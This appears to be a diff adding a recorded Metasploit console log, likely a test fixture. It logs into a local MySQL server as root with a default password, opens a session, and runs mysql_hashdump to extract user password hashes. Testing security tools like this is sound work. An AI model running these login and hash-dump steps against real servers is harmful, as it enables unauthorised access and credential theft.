@@ -1,0 +1,43 @@
+Calling `DidYouMean::SPELL_CHECKERS.merge!(error_name => spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.
+Calling `DidYouMean::SPELL_CHECKERS.merge!(error_name => spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 43 modules:
+    14 auxiliary modules
+    13 exploit modules
+    16 post modules
+[4mmsf6[0m [0m> features set mysql_session_type true
+mysql_session_type => true
+[!] Run the save command and restart the console for this feature to take effect.
+[4mmsf6[0m [0m> use auxiliary/scanner/mysql/mysql_login
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+[4mmsf6[0m auxiliary([1m[31mscanner/mysql/mysql_login[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+[4mmsf6[0m auxiliary([1m[31mscanner/mysql/mysql_login[0m) [0m> run PASS_FILE= USER_FILE= CreateSession=true username=root password=password rhost=127.0.0.1 rport=3306
+[+] 127.0.0.1:3306        - 127.0.0.1:3306 - Found remote MySQL version 11.4.2
+[!] 127.0.0.1:3306        - No active DB -- Credential data will not be saved!
+[+] 127.0.0.1:3306        - 127.0.0.1:3306 - Success: 'root:password'
+[*] MySQL session 1 opened (127.0.0.1:39327 -> 127.0.0.1:3306) at 2024-07-04 08:40:00 +0000
+use auxiliary/scanner/mysql/mysql_hashdump
+[*] 127.0.0.1:3306        - Scanned 1 of 1 hosts (100% complete)
+[*] 127.0.0.1:3306        - Bruteforce completed, 1 credential was successful.
+[*] 127.0.0.1:3306        - 1 MySQL session was opened successfully.
+[*] Auxiliary module execution completed
+[4mmsf6[0m auxiliary([1m[31mscanner/mysql/mysql_login[0m) [0m> run session=1 Verbose=true
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[4mmsf6[0m auxiliary([1m[31mscanner/mysql/mysql_hashdump[0m) [0m> [*] Using existing session 1
+[!] No active DB -- Credential data will not be saved!
+[*] 127.0.0.1:3306 MySQL - querying with 'SELECT @@version'
+[*] 127.0.0.1:3306 MySQL - querying with 'SELECT user,authentication_string from mysql.user'
+[+] Saving HashString as Loot: mariadb.sys:
+[+] Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+[+] Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+[+] Saving HashString as Loot: healthcheck:*134789267633AFFC8179CA128F0BB84354E1FDAA
+[+] Saving HashString as Loot: healthcheck:*134789267633AFFC8179CA128F0BB84354E1FDAA
+[+] Saving HashString as Loot: healthcheck:*134789267633AFFC8179CA128F0BB84354E1FDAA
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+sessions -K
+[4mmsf6[0m auxiliary([1m[31mscanner/mysql/mysql_hashdump[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - MySQL session 1 closed.
+[4mmsf6[0m auxiliary([1m[31mscanner/mysql/mysql_hashdump[0m) [0m> 
